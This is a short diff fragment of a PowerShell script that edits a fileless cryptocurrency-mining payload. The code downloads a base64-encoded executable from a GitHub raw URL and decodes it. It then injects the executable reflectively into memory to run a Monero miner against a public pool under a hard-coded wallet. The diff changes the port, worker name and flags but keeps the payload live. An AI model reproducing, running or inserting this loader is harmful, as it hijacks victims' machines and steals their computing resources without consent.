@@ -2743,7 +2743,7 @@ Function Main
 
 Main
 }
-$str=(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/smarshallhb/Testing/master/x.txt')
-$PEBytes = [System.Convert]::FromBase64String($str)
-Invoke-ReflectivePEInjection -PEBytes $PEBytes -ForceASLR -EXEArgs "-o stratum+tcp://pool.minexmr.com:5555 -u 46jzXCKBqKHCuGogZbhJGfW84mb7rAWCZbACHAWDjKs7RDChaULHL2BHcpfwNMXCvyV8hbyR67ZAXgJEY3cL94WtVGgnzHC.fooly -p x -k --donate-level 1"
+$str1 = (new-object System.Net.WebClient).downloadstring("https://raw.githubusercontent.com/smarshallhb/Testing/master/x.txt")
+$PEBytes = [System.Convert]::FromBase64String($str1)
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -EXEArgs "-o stratum+tcp://pool.minexmr.com:4444 -u 46jzXCKBqKHCuGogZbhJGfW84mb7rAWCZbACHAWDjKs7RDChaULHL2BHcpfwNMXCvyV8hbyR67ZAXgJEY3cL94WtVGgnzHC.foo -p x -k --donate-level 1"
 }
